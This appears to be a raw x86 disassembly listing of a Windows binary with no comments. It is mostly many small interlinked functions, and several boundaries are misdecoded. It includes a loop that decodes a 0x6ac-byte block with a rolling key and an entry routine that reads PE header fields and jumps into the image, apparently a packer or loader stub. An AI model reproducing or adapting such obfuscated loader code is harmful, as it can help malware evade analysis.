  4d07a3:	call   edi
  4d07a5:	add    BYTE PTR [eax],al
  4d07a7:	add    BYTE PTR [edi-0x1],bl
  4d07aa:	adc    eax,0x4d2028
  4d07af:	call   edi
  4d07b1:	add    BYTE PTR [eax],al
  4d07b3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d07b9:	sub    esp,0x24
  4d07bc:	lea    esi,ds:0x4d3114
  4d07c2:	add    DWORD PTR [esi+0x9c],0x5195
  4d07cc:	push   0x0
  4d07ce:	call   0x4d0df8
  4d07d3:	add    esp,0x4
  4d07d6:	push   esi
  4d07d7:	push   edx
  4d07d8:	push   DWORD PTR [esi+0xac]
  4d07de:	call   0x4d122c
  4d07e3:	add    esp,0x8
  4d07e6:	pop    esi
  4d07e7:	mov    ebx,0x4d2000
  4d07ec:	mov    ebx,DWORD PTR [ebx]
  4d07ee:	push   ebx
  4d07ef:	push   DWORD PTR [esi+0x14]
  4d07f2:	pop    ecx
  4d07f3:	call   ecx
  4d07f5:	add    esp,0x24
  4d07f8:	pop    ebp
  4d07f9:	ret    
  4d07fa:	add    BYTE PTR [eax],al
  4d07fc:	mov    edi,edi
  4d07fe:	push   ebp
  4d07ff:	mov    ebp,esp
  4d0801:	sub    esp,0x24
  4d0804:	lea    eax,ds:0x4d3174
  4d080a:	cmp    eax,0xd19
  4d080f:	je     0x4d07ff
  4d0811:	push   eax
  4d0812:	mov    eax,0x0
  4d0817:	push   eax
  4d0818:	call   0x4d1024
  4d081d:	add    esp,0x4
  4d0820:	pop    eax
  4d0821:	push   eax
  4d0822:	push   edx
  4d0823:	push   DWORD PTR [eax+0x4c]
  4d0826:	push   DWORD PTR [eax+0x1d8]
  4d082c:	call   0x4d08e0
  4d0831:	add    esp,0xc
  4d0834:	pop    eax
  4d0835:	push   eax
  4d0836:	mov    ebx,0xfffffff4
  4d083b:	push   ebx
  4d083c:	call   0x4d1374
  4d0841:	add    esp,0x4
  4d0844:	pop    eax
  4d0845:	add    esp,0x24
  4d0848:	pop    ebp
  4d0849:	ret    
  4d084a:	add    BYTE PTR [eax],al
  4d084c:	pop    edi
  4d084d:	call   DWORD PTR ds:0x4d209c
  4d0853:	call   edi
  4d0855:	add    BYTE PTR [eax],al
  4d0857:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d085d:	sub    esp,0x20
  4d0860:	lea    esi,ds:0x4d3190
  4d0866:	xor    ebx,DWORD PTR [esi+0x58]
  4d0869:	push   esi
  4d086a:	push   edi
  4d086b:	push   DWORD PTR [esi+0x1e4]
  4d0871:	call   0x4d11d0
  4d0876:	add    esp,0x8
  4d0879:	pop    esi
  4d087a:	call   0x4d1538
  4d087f:	add    esp,0x4
  4d0882:	push   0x0
  4d0884:	call   0x4d0f48
  4d0889:	add    esp,0x4
  4d088c:	add    esp,0x20
  4d088f:	pop    ebp
  4d0890:	ret    
  4d0891:	add    BYTE PTR [eax],al
  4d0893:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0899:	sub    esp,0x4c
  4d089c:	lea    ecx,ds:0x4d3030
  4d08a2:	mov    DWORD PTR [ecx-0x4],edi
  4d08a5:	push   ecx
  4d08a6:	push   DWORD PTR [ecx+0x5c]
  4d08a9:	push   edx
  4d08aa:	push   edi
  4d08ab:	call   0x4d0f54
  4d08b0:	add    esp,0xc
  4d08b3:	pop    ecx
  4d08b4:	push   ecx
  4d08b5:	push   0x0
  4d08b7:	call   0x4d14e4
  4d08bc:	add    esp,0x4
  4d08bf:	pop    ecx
  4d08c0:	push   ecx
  4d08c1:	push   0x0
  4d08c3:	call   0x4d0a54
  4d08c8:	add    esp,0x4
  4d08cb:	pop    ecx
  4d08cc:	add    esp,0x4c
  4d08cf:	pop    ebp
  4d08d0:	ret    
  4d08d1:	add    BYTE PTR [eax],al
  4d08d3:	add    BYTE PTR [edi-0x1],bl
  4d08d6:	adc    eax,0x4d2000
  4d08db:	call   edi
  4d08dd:	add    BYTE PTR [eax],al
  4d08df:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08e5:	sub    esp,0x4c
  4d08e8:	lea    esi,ds:0x4d3014
  4d08ee:	or     edx,DWORD PTR [ebp-0x3c]
  4d08f1:	push   esi
  4d08f2:	push   edi
  4d08f3:	push   edi
  4d08f4:	push   DWORD PTR [esi+0xb0]
  4d08fa:	push   DWORD PTR [esi+0x4]
  4d08fd:	call   0x4d06ec
  4d0902:	add    esp,0x10
  4d0905:	pop    esi
  4d0906:	call   0x4d07a8
  4d090b:	add    esp,0x4
  4d090e:	mov    edx,0x0
  4d0913:	push   edx
  4d0914:	call   0x4d12b0
  4d0919:	add    esp,0x4
  4d091c:	add    esp,0x4c
  4d091f:	pop    ebp
  4d0920:	ret    
  4d0921:	add    BYTE PTR [eax],al
  4d0923:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0929:	sub    esp,0x4c
  4d092c:	sub    DWORD PTR [ebp-0x48],ebx
  4d092f:	mov    edi,0x4d31e4
  4d0934:	push   edi
  4d0935:	push   0x6ac
  4d093a:	push   0x6ac
  4d093f:	mov    eax,0x40001
  4d0944:	push   eax
  4d0945:	mov    ecx,0x862985b6
  4d094a:	push   DWORD PTR [ecx+0x7a239a86]
  4d0950:	sub    DWORD PTR [esp],0x2
  4d0954:	mov    ecx,0x4d2034
  4d0959:	pop    DWORD PTR [ecx]
  4d095b:	call   0x4d135c
  4d0960:	add    esp,0x4
  4d0963:	xchg   DWORD PTR [esp],eax
  4d0966:	mov    edi,eax
  4d0968:	pop    DWORD PTR [edi-0xbc]
  4d096e:	mov    edx,DWORD PTR [edi-0xbc]
  4d0974:	mov    eax,edx
  4d0976:	sub    esi,esi
  4d0978:	dec    esi
  4d0979:	and    esi,0x4d0014
  4d097f:	mov    ecx,0x7ec7f445
  4d0984:	xor    edx,edx
  4d0986:	cmp    edx,0x6ac
  4d098c:	je     0x4d09aa
  4d098e:	sub    edx,0xfffffffc
  4d0991:	xor    ebx,ebx
  4d0993:	push   DWORD PTR [esi+ebx*1]
  4d0996:	add    DWORD PTR [esp],ecx
  4d0999:	pop    DWORD PTR [eax+ebx*2]
  4d099c:	dec    DWORD PTR [eax]
  4d099e:	xor    ecx,ecx
  4d09a0:	add    ecx,DWORD PTR [esi]
  4d09a2:	add    esi,0x4
  4d09a5:	add    eax,0x4
  4d09a8:	jmp    0x4d0986
  4d09aa:	push   edi
  4d09ab:	push   0x0
  4d09ad:	call   0x4d14e4
  4d09b2:	add    esp,0x4
  4d09b5:	pop    edi
  4d09b6:	add    esp,0x4c
  4d09b9:	pop    ebp
  4d09ba:	ret    
  4d09bb:	add    BYTE PTR [edi-0x1],bl
  4d09be:	adc    eax,0x4d2088
  4d09c3:	call   edi
  4d09c5:	add    BYTE PTR [eax],al
  4d09c7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09cd:	sub    esp,0x28
  4d09d0:	lea    ebx,[eax-0x74]
  4d09d3:	add    edx,ebx
  4d09d5:	push   ebx
  4d09d6:	push   eax
  4d09d7:	push   eax
  4d09d8:	call   0x4d14f0
  4d09dd:	add    esp,0x8
  4d09e0:	pop    ebx
  4d09e1:	call   0x4d0e04
  4d09e6:	add    esp,0x4
  4d09e9:	mov    ecx,0x0
  4d09ee:	push   ecx
  4d09ef:	call   0x4d0df8
  4d09f4:	add    esp,0x4
  4d09f7:	add    esp,0x28
  4d09fa:	pop    ebp
  4d09fb:	ret    
  4d09fc:	pop    edi
  4d09fd:	call   DWORD PTR ds:0x4d205c
  4d0a03:	call   edi
  4d0a05:	add    BYTE PTR [eax],al
  4d0a07:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a0d:	sub    esp,0x24
  4d0a10:	lea    ebx,ds:0x4d30b8
  4d0a16:	sub    DWORD PTR [ebx+0x44],0xffff85d0
  4d0a1d:	push   ebx
  4d0a1e:	push   edi
  4d0a1f:	push   DWORD PTR [ebx+0x54]
  4d0a22:	push   DWORD PTR [ebx+0x1e8]
  4d0a28:	push   DWORD PTR [ebx+0x1b8]
  4d0a2e:	call   0x4d103c
  4d0a33:	add    esp,0x10
  4d0a36:	pop    ebx
  4d0a37:	mov    edx,0x0
  4d0a3c:	push   edx
  4d0a3d:	call   0x4d0a54
  4d0a42:	add    esp,0x4
  4d0a45:	call   0x4d07a8
  4d0a4a:	add    esp,0x4
  4d0a4d:	add    esp,0x24
  4d0a50:	pop    ebp
  4d0a51:	ret    
  4d0a52:	add    BYTE PTR [eax],al
  4d0a54:	pop    edi
  4d0a55:	call   DWORD PTR ds:0x4d2080
  4d0a5b:	call   edi
  4d0a5d:	add    BYTE PTR [eax],al
  4d0a5f:	add    BYTE PTR [edi-0x1],bl
  4d0a62:	adc    eax,0x4d201c
  4d0a67:	call   edi
  4d0a69:	add    BYTE PTR [eax],al
  4d0a6b:	add    BYTE PTR [edi-0x1],bl
  4d0a6e:	adc    eax,0x4d2070
  4d0a73:	call   edi
  4d0a75:	add    BYTE PTR [eax],al
  4d0a77:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a7d:	sub    esp,0x2c
  4d0a80:	mov    ebx,0x4d311c
  4d0a85:	sbb    ecx,DWORD PTR [ebp-0x4]
  4d0a88:	push   ebx
  4d0a89:	push   eax
  4d0a8a:	push   DWORD PTR [ebx+0x1d0]
  4d0a90:	push   DWORD PTR [ebx+0x118]
  4d0a96:	call   0x4d1544
  4d0a9b:	add    esp,0xc
  4d0a9e:	pop    ebx
  4d0a9f:	push   0x0
  4d0aa1:	call   0x4d12b0
  4d0aa6:	add    esp,0x4
  4d0aa9:	call   0x4d1538
  4d0aae:	add    esp,0x4
  4d0ab1:	add    esp,0x2c
  4d0ab4:	pop    ebp
  4d0ab5:	ret    
  4d0ab6:	add    BYTE PTR [eax],al
  4d0ab8:	mov    edi,edi
  4d0aba:	push   ebp
  4d0abb:	mov    ebp,esp
  4d0abd:	sub    esp,0x44
  4d0ac0:	lea    esi,ds:0x4d3040
  4d0ac6:	mov    edx,esi
  4d0ac8:	push   esi
  4d0ac9:	push   edx
  4d0aca:	push   DWORD PTR [esi+0xc]
  4d0acd:	push   edi
  4d0ace:	call   0x4d14a4
  4d0ad3:	add    esp,0xc
  4d0ad6:	pop    esi
  4d0ad7:	mov    ebx,0xfffffff4
  4d0adc:	push   ebx
  4d0add:	call   0x4d1374
  4d0ae2:	add    esp,0x4
  4d0ae5:	call   0x4d1538
  4d0aea:	add    esp,0x4
  4d0aed:	add    esp,0x44
  4d0af0:	pop    ebp
  4d0af1:	ret    
  4d0af2:	add    BYTE PTR [eax],al
  4d0af4:	pop    edi
  4d0af5:	call   DWORD PTR ds:0x4d2054
  4d0afb:	call   edi
  4d0afd:	add    BYTE PTR [eax],al
  4d0aff:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b05:	sub    esp,0x48
  4d0b08:	lea    edx,[eax-0xe4]
  4d0b0e:	sub    eax,0xffffff88
  4d0b11:	push   edx
  4d0b12:	mov    edx,0xfffffff4
  4d0b17:	push   edx
  4d0b18:	call   0x4d1374
  4d0b1d:	add    esp,0x4
  4d0b20:	pop    edx
  4d0b21:	push   edx
  4d0b22:	push   ebx
  4d0b23:	push   DWORD PTR [edx+0x80]
  4d0b29:	call   0x4d1404
  4d0b2e:	add    esp,0x8
  4d0b31:	pop    edx
  4d0b32:	push   edx
  4d0b33:	push   0x0
  4d0b35:	call   0x4d14e4
  4d0b3a:	add    esp,0x4
  4d0b3d:	pop    edx
  4d0b3e:	add    esp,0x48
  4d0b41:	pop    ebp
  4d0b42:	ret    
  4d0b43:	add    BYTE PTR [edi-0x1],bl
  4d0b46:	adc    eax,0x4d2068
  4d0b4b:	call   edi
  4d0b4d:	add    BYTE PTR [eax],al
  4d0b4f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b55:	sub    esp,0x28
  4d0b58:	lea    ecx,[edi-0x14]
  4d0b5b:	mov    DWORD PTR [ebp-0x20],eax
  4d0b5e:	push   ecx
  4d0b5f:	push   DWORD PTR [ecx+0x150]
  4d0b65:	push   DWORD PTR [ecx]
  4d0b67:	push   ebx
  4d0b68:	push   eax
  4d0b69:	call   0x4d0a08
  4d0b6e:	add    esp,0x10
  4d0b71:	pop    ecx
  4d0b72:	push   ecx
  4d0b73:	mov    esi,0x0
  4d0b78:	push   esi
  4d0b79:	call   0x4d0a54
  4d0b7e:	add    esp,0x4
  4d0b81:	pop    ecx
  4d0b82:	push   ecx
  4d0b83:	push   0x0
  4d0b85:	call   0x4d0df8
  4d0b8a:	add    esp,0x4
  4d0b8d:	pop    ecx
  4d0b8e:	add    esp,0x28
  4d0b91:	pop    ebp
  4d0b92:	ret    
  4d0b93:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b99:	sub    esp,0x30
  4d0b9c:	lea    edi,[esi+0x120]
  4d0ba2:	cmp    edi,0x69b7
  4d0ba8:	jb     0x4d0b97
  4d0baa:	push   edi
  4d0bab:	push   edx
  4d0bac:	push   eax
  4d0bad:	call   0x4d0e74
  4d0bb2:	add    esp,0x8
  4d0bb5:	pop    edi
  4d0bb6:	push   edi
  4d0bb7:	push   0x0
  4d0bb9:	call   0x4d0a6c
  4d0bbe:	add    esp,0x4
  4d0bc1:	pop    edi
  4d0bc2:	push   edi
  4d0bc3:	mov    ecx,0x0
  4d0bc8:	push   ecx
  4d0bc9:	call   0x4d0a54
  4d0bce:	add    esp,0x4
  4d0bd1:	pop    edi
  4d0bd2:	add    esp,0x30
  4d0bd5:	pop    ebp
  4d0bd6:	ret    
  4d0bd7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0bdd:	sub    esp,0x50
  4d0be0:	lea    esi,ds:0x4d315c
  4d0be6:	adc    DWORD PTR [ebp-0x44],ebx
  4d0be9:	push   esi
  4d0bea:	push   eax
  4d0beb:	push   DWORD PTR [esi+0xf0]
  4d0bf1:	push   DWORD PTR [esi+0xc0]
  4d0bf7:	push   DWORD PTR [esi+0x13c]
  4d0bfd:	call   0x4d0db0
  4d0c02:	add    esp,0x10
  4d0c05:	pop    esi
  4d0c06:	call   0x4d0e04
  4d0c0b:	add    esp,0x4
  4d0c0e:	mov    ebx,0x0
  4d0c13:	push   ebx
  4d0c14:	call   0x4d0cc0
  4d0c19:	add    esp,0x4
  4d0c1c:	add    esp,0x50
  4d0c1f:	pop    ebp
  4d0c20:	ret    
  4d0c21:	add    BYTE PTR [eax],al
  4d0c23:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c29:	sub    esp,0x20
  4d0c2c:	lea    esi,[ecx-0x100]
  4d0c32:	cmp    esi,0x5da2
  4d0c38:	jbe    0x4d0c27
  4d0c3a:	call   0x4d0e04
  4d0c3f:	add    esp,0x4
  4d0c42:	push   esi
  4d0c43:	push   eax
  4d0c44:	push   ecx
  4d0c45:	push   edi
  4d0c46:	call   0x4d0b94
  4d0c4b:	add    esp,0xc
  4d0c4e:	pop    esi
  4d0c4f:	push   0x0
  4d0c51:	call   0x4d14e4
  4d0c56:	add    esp,0x4
  4d0c59:	add    esp,0x20
  4d0c5c:	pop    ebp
  4d0c5d:	ret    
  4d0c5e:	add    BYTE PTR [eax],al
  4d0c60:	push   edi
  4d0c61:	sub    edi,edi
  4d0c63:	push   edi
  4d0c64:	push   edi
  4d0c65:	push   edi
  4d0c66:	push   edi
  4d0c67:	call   0x4d07a8
  4d0c6c:	sub    esp,0xfffffffc
  4d0c6f:	call   0x4d0a60
  4d0c74:	push   0x2
  4d0c76:	xor    eax,eax
  4d0c78:	sub    eax,0x4d3030
  4d0c7d:	neg    eax
  4d0c7f:	push   0x0
  4d0c81:	lea    ecx,[eax+0x7]
  4d0c84:	add    BYTE PTR [ecx],0x41
  4d0c87:	push   eax
  4d0c88:	call   0x4d135c
  4d0c8d:	pop    edi
  4d0c8e:	pop    edi
  4d0c8f:	pop    edi
  4d0c90:	lea    ecx,[eax+0x3b]
  4d0c93:	mov    edi,DWORD PTR [ecx]
  4d0c95:	lea    eax,[eax+edi*1]
  4d0c98:	mov    eax,DWORD PTR [eax+0x28]
  4d0c9b:	pusha  
  4d0c9c:	mov    ah,0x45
  4d0c9e:	sub    al,ah
  4d0ca0:	ja     0x4d07b4
  4d0ca6:	popa   
  4d0ca7:	ret    
  4d0ca8:	pop    edi
  4d0ca9:	call   DWORD PTR ds:0x4d200c
  4d0caf:	call   edi
  4d0cb1:	add    BYTE PTR [eax],al
  4d0cb3:	add    BYTE PTR [edi-0x1],bl
  4d0cb6:	adc    eax,0x4d2060
  4d0cbb:	call   edi
  4d0cbd:	add    BYTE PTR [eax],al
  4d0cbf:	add    BYTE PTR [edi-0x1],bl
  4d0cc2:	adc    eax,0x4d2004
  4d0cc7:	call   edi
  4d0cc9:	add    BYTE PTR [eax],al
  4d0ccb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0cd1:	sub    esp,0x58
  4d0cd4:	lea    edx,[edi+0x84]
  4d0cda:	add    DWORD PTR [ebp-0x54],0x1c
  4d0cde:	push   edx
  4d0cdf:	mov    edx,0x0
  4d0ce4:	push   edx
  4d0ce5:	call   0x4d12b0
  4d0cea:	add    esp,0x4
  4d0ced:	pop    edx
  4d0cee:	push   edx
  4d0cef:	push   DWORD PTR [edx+0xe4]
  4d0cf5:	push   DWORD PTR [edx+0xf0]
  4d0cfb:	call   0x4d0ab8
  4d0d00:	add    esp,0x8
  4d0d03:	pop    edx
  4d0d04:	push   edx
  4d0d05:	push   0x0
  4d0d07:	call   0x4d0df8
  4d0d0c:	add    esp,0x4
  4d0d0f:	pop    edx
  4d0d10:	add    esp,0x58
  4d0d13:	pop    ebp
  4d0d14:	ret    
  4d0d15:	add    BYTE PTR [eax],al
  4d0d17:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d1d:	sub    esp,0x20
  4d0d20:	mov    edx,0x4d315c
  4d0d25:	mov    DWORD PTR [ebp-0x1c],0x1
  4d0d2c:	push   edx
  4d0d2d:	push   DWORD PTR [edx+0x158]
  4d0d33:	push   esi
  4d0d34:	call   0x4d112c
  4d0d39:	add    esp,0x8
  4d0d3c:	pop    edx
  4d0d3d:	push   edx
  4d0d3e:	mov    edi,0x0
  4d0d43:	push   edi
  4d0d44:	call   0x4d0cb4
  4d0d49:	add    esp,0x4
  4d0d4c:	pop    edx
  4d0d4d:	push   edx
  4d0d4e:	mov    ebx,0x0
  4d0d53:	push   ebx
  4d0d54:	call   0x4d0f48
  4d0d59:	add    esp,0x4
  4d0d5c:	pop    edx
  4d0d5d:	add    esp,0x20
  4d0d60:	pop    ebp
  4d0d61:	ret    
  4d0d62:	add    BYTE PTR [eax],al
  4d0d64:	mov    edi,edi
  4d0d66:	push   ebp
  4d0d67:	mov    ebp,esp
  4d0d69:	sub    esp,0x38
  4d0d6c:	lea    ebx,ds:0x4d307c
  4d0d72:	mov    ecx,edx
  4d0d74:	push   ebx
  4d0d75:	push   eax
  4d0d76:	push   DWORD PTR [ebx+0x1fc]
  4d0d7c:	push   esi
  4d0d7d:	call   0x4d0d18
  4d0d82:	add    esp,0xc
  4d0d85:	pop    ebx
  4d0d86:	push   0x0
  4d0d88:	call   0x4d1024
  4d0d8d:	add    esp,0x4
  4d0d90:	mov    ecx,0x0
  4d0d95:	push   ecx
  4d0d96:	call   0x4d1080
  4d0d9b:	add    esp,0x4
  4d0d9e:	add    esp,0x38
  4d0da1:	pop    ebp
  4d0da2:	ret    
  4d0da3:	add    BYTE PTR [edi-0x1],bl
  4d0da6:	adc    eax,0x4d2064
  4d0dab:	call   edi
  4d0dad:	add    BYTE PTR [eax],al
  4d0daf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0db5:	sub    esp,0x40
  4d0db8:	lea    eax,[esi-0x44]
  4d0dbb:	sbb    DWORD PTR [ebp-0x1c],0x4501
  4d0dc2:	push   eax
  4d0dc3:	push   DWORD PTR [eax+0x28]
  4d0dc6:	push   ecx
  4d0dc7:	call   0x4d0b00
  4d0dcc:	add    esp,0x8
  4d0dcf:	pop    eax
  4d0dd0:	push   eax
  4d0dd1:	lea    edi,[eax-0x118]
  4d0dd7:	push   edi
  4d0dd8:	call   0x4d08d4
  4d0ddd:	add    esp,0x4
  4d0de0:	test   eax,eax
  4d0de2:	jne    0x4d0dd1
  4d0de4:	pop    eax
  4d0de5:	push   eax
  4d0de6:	push   0x0
  4d0de8:	call   0x4d0df8
  4d0ded:	add    esp,0x4
  4d0df0:	pop    eax
  4d0df1:	add    esp,0x40
  4d0df4:	pop    ebp
  4d0df5:	ret    
  4d0df6:	add    BYTE PTR [eax],al
  4d0df8:	pop    edi
  4d0df9:	call   DWORD PTR ds:0x4d2040
  4d0dff:	call   edi
  4d0e01:	add    BYTE PTR [eax],al
  4d0e03:	add    BYTE PTR [edi-0x1],bl
  4d0e06:	adc    eax,0x4d204c
  4d0e0b:	call   edi
  4d0e0d:	add    BYTE PTR [eax],al
  4d0e0f:	add    BYTE PTR [edi-0x1],bl
  4d0e12:	adc    eax,0x4d2074
  4d0e17:	call   edi
  4d0e19:	add    BYTE PTR [eax],al
  4d0e1b:	add    BYTE PTR [edi-0x1],bl
  4d0e1e:	adc    eax,0x4d2098
  4d0e23:	call   edi
  4d0e25:	add    BYTE PTR [eax],al
  4d0e27:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e2d:	sub    esp,0x3c
  4d0e30:	lea    ecx,ds:0x4d3024
  4d0e36:	xor    esi,DWORD PTR [ecx+0x1a8]
  4d0e3c:	push   ecx
  4d0e3d:	mov    ebx,0x0
  4d0e42:	push   ebx
  4d0e43:	call   0x4d1080
  4d0e48:	add    esp,0x4
  4d0e4b:	pop    ecx
  4d0e4c:	push   ecx
  4d0e4d:	push   ebx
  4d0e4e:	push   DWORD PTR [ecx+0xe4]
  4d0e54:	push   ebx
  4d0e55:	push   DWORD PTR [ecx+0x100]
  4d0e5b:	call   0x4d1580
  4d0e60:	add    esp,0x10
  4d0e63:	pop    ecx
  4d0e64:	push   ecx
  4d0e65:	call   0x4d1538
  4d0e6a:	add    esp,0x4
  4d0e6d:	pop    ecx
  4d0e6e:	add    esp,0x3c
  4d0e71:	pop    ebp
  4d0e72:	ret    
  4d0e73:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e79:	sub    esp,0x1c
  4d0e7c:	mov    eax,0x4d3170
  4d0e81:	or     edx,ecx
  4d0e83:	push   eax
  4d0e84:	call   0x4d07a8
  4d0e89:	add    esp,0x4
  4d0e8c:	pop    eax
  4d0e8d:	push   eax
  4d0e8e:	push   DWORD PTR [eax+0x18]
  4d0e91:	push   DWORD PTR [eax+0x1f4]
  4d0e97:	push   DWORD PTR [eax+0x1f8]
  4d0e9d:	push   edx
  4d0e9e:	call   0x4d0894
  4d0ea3:	add    esp,0x10
  4d0ea6:	pop    eax
  4d0ea7:	push   eax
  4d0ea8:	call   0x4d1538
  4d0ead:	add    esp,0x4
  4d0eb0:	pop    eax
  4d0eb1:	add    esp,0x1c
  4d0eb4:	pop    ebp
  4d0eb5:	ret    
  4d0eb6:	add    BYTE PTR [eax],al
  4d0eb8:	mov    edi,edi
  4d0eba:	push   ebp
  4d0ebb:	mov    ebp,esp
  4d0ebd:	sub    esp,0x24
  4d0ec0:	lea    ecx,ds:0x4d31ac
  4d0ec6:	and    edi,ebx
  4d0ec8:	push   ecx
  4d0ec9:	push   DWORD PTR [ecx+0xf8]
  4d0ecf:	push   DWORD PTR [ecx+0xec]
  4d0ed5:	push   edi
  4d0ed6:	call   0x4d0bd8
  4d0edb:	add    esp,0xc
  4d0ede:	pop    ecx
  4d0edf:	push   ecx
  4d0ee0:	mov    eax,0x0
  4d0ee5:	push   eax
  4d0ee6:	call   0x4d0df8
  4d0eeb:	add    esp,0x4
  4d0eee:	pop    ecx
  4d0eef:	push   ecx
  4d0ef0:	push   0xfffffff4
  4d0ef2:	call   0x4d1374
  4d0ef7:	add    esp,0x4
  4d0efa:	pop    ecx
  4d0efb:	add    esp,0x24
  4d0efe:	pop    ebp
  4d0eff:	ret    
  4d0f00:	mov    edi,edi
  4d0f02:	push   ebp
  4d0f03:	mov    ebp,esp
  4d0f05:	sub    esp,0x5c
  4d0f08:	mov    eax,0x4d3028
  4d0f0d:	and    edx,0xffffee72
  4d0f13:	push   eax
  4d0f14:	push   DWORD PTR [eax+0x48]
  4d0f17:	push   ebx
  4d0f18:	push   ebx
  4d0f19:	call   0x4d0eb8
  4d0f1e:	add    esp,0xc
  4d0f21:	pop    eax
  4d0f22:	push   eax
  4d0f23:	lea    esi,[eax-0x28]
  4d0f26:	push   esi
  4d0f27:	call   0x4d08d4
  4d0f2c:	add    esp,0x4
  4d0f2f:	test   eax,eax
  4d0f31:	jne    0x4d0f23
  4d0f33:	pop    eax
  4d0f34:	push   eax
  4d0f35:	push   0x0
  4d0f37:	call   0x4d1024
  4d0f3c:	add    esp,0x4
  4d0f3f:	pop    eax
  4d0f40:	add    esp,0x5c
  4d0f43:	pop    ebp
  4d0f44:	ret    
  4d0f45:	add    BYTE PTR [eax],al
  4d0f47:	add    BYTE PTR [edi-0x1],bl
  4d0f4a:	adc    eax,0x4d2024
  4d0f4f:	call   edi
  4d0f51:	add    BYTE PTR [eax],al
  4d0f53:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f59:	sub    esp,0x28
  4d0f5c:	lea    eax,ds:0x4d31b8
  4d0f62:	mov    DWORD PTR [eax-0x14],0x5f
  4d0f69:	push   eax
  4d0f6a:	push   ecx
  4d0f6b:	push   DWORD PTR [eax+0x178]
  4d0f71:	push   ecx
  4d0f72:	call   0x4d0d64
  4d0f77:	add    esp,0xc
  4d0f7a:	pop    eax
  4d0f7b:	push   eax
  4d0f7c:	push   0x0
  4d0f7e:	call   0x4d12b0
  4d0f83:	add    esp,0x4
  4d0f86:	pop    eax
  4d0f87:	push   eax
  4d0f88:	call   0x4d07a8
  4d0f8d:	add    esp,0x4
  4d0f90:	pop    eax
  4d0f91:	add    esp,0x28
  4d0f94:	pop    ebp
  4d0f95:	ret    
  4d0f96:	add    BYTE PTR [eax],al
  4d0f98:	mov    edi,edi
  4d0f9a:	push   ebp
  4d0f9b:	mov    ebp,esp
  4d0f9d:	sub    esp,0x60
  4d0fa0:	lea    ebx,[eax+0x30]
  4d0fa3:	xor    esi,DWORD PTR [ebx+0xa0]
  4d0fa9:	push   ebx
  4d0faa:	push   DWORD PTR [ebx+0x1ac]
  4d0fb0:	push   DWORD PTR [ebx+0x1c0]
  4d0fb6:	call   0x4d1098
  4d0fbb:	add    esp,0x8
  4d0fbe:	pop    ebx
  4d0fbf:	lea    edi,[ebx-0x44]
  4d0fc2:	push   edi
  4d0fc3:	call   0x4d08d4
  4d0fc8:	add    esp,0x4
  4d0fcb:	test   eax,eax
  4d0fcd:	jne    0x4d0fc0
  4d0fcf:	mov    eax,0x0
  4d0fd4:	push   eax
  4d0fd5:	call   0x4d0a6c
  4d0fda:	add    esp,0x4
  4d0fdd:	add    esp,0x60
  4d0fe0:	pop    ebp
  4d0fe1:	ret    
  4d0fe2:	add    BYTE PTR [eax],al
  4d0fe4:	mov    edi,edi
  4d0fe6:	push   ebp
  4d0fe7:	mov    ebp,esp
  4d0fe9:	sub    esp,0x40
  4d0fec:	lea    edx,ds:0x4d3098
  4d0ff2:	and    eax,DWORD PTR [edx-0xc]
  4d0ff5:	push   edx
  4d0ff6:	call   0x4d0e04
  4d0ffb:	add    esp,0x4
  4d0ffe:	pop    edx
  4d0fff:	push   edx
  4d1000:	push   ecx
  4d1001:	push   edi
  4d1002:	push   eax
  4d1003:	push   DWORD PTR [edx+0xe0]
  4d1009:	call   0x4d1398
  4d100e:	add    esp,0x10
  4d1011:	pop    edx
  4d1012:	push   edx
  4d1013:	call   0x4d07a8
  4d1018:	add    esp,0x4
  4d101b:	pop    edx
  4d101c:	add    esp,0x40
  4d101f:	pop    ebp
  4d1020:	ret    
  4d1021:	add    BYTE PTR [eax],al
  4d1023:	add    BYTE PTR [edi-0x1],bl
  4d1026:	adc    eax,0x4d2008
  4d102b:	call   edi
  4d102d:	add    BYTE PTR [eax],al
  4d102f:	add    BYTE PTR [edi-0x1],bl
  4d1032:	adc    eax,0x4d2058
  4d1037:	call   edi
  4d1039:	add    BYTE PTR [eax],al
  4d103b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1041:	sub    esp,0x20
  4d1044:	lea    edi,ds:0x4d3070
  4d104a:	add    ecx,DWORD PTR [ebp-0x14]
  4d104d:	push   edi
  4d104e:	push   edx
  4d104f:	push   eax
  4d1050:	push   DWORD PTR [edi+0x40]
  4d1053:	push   eax
  4d1054:	call   0x4d0e28
  4d1059:	add    esp,0x10
  4d105c:	pop    edi
  4d105d:	push   edi
  4d105e:	lea    edi,[edi-0x70]
  4d1061:	push   edi
  4d1062:	call   0x4d08d4
  4d1067:	add    esp,0x4
  4d106a:	test   eax,eax
  4d106c:	jne    0x4d105e
  4d106e:	pop    edi
  4d106f:	push   edi
  4d1070:	call   0x4d0e04
  4d1075:	add    esp,0x4
  4d1078:	pop    edi
  4d1079:	add    esp,0x20
  4d107c:	pop    ebp
  4d107d:	ret    
  4d107e:	add    BYTE PTR [eax],al
  4d1080:	pop    edi
  4d1081:	call   DWORD PTR ds:0x4d2020
  4d1087:	call   edi
  4d1089:	add    BYTE PTR [eax],al
  4d108b:	add    BYTE PTR [edi-0x1],bl
  4d108e:	adc    eax,0x4d208c
  4d1093:	call   edi
  4d1095:	add    BYTE PTR [eax],al
  4d1097:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d109d:	sub    esp,0x54
  4d10a0:	lea    ecx,ds:0x4d30e4
  4d10a6:	cmp    ecx,0x258b
  4d10ac:	je     0x4d109b
  4d10ae:	push   ecx
  4d10af:	push   esi
  4d10b0:	push   esi
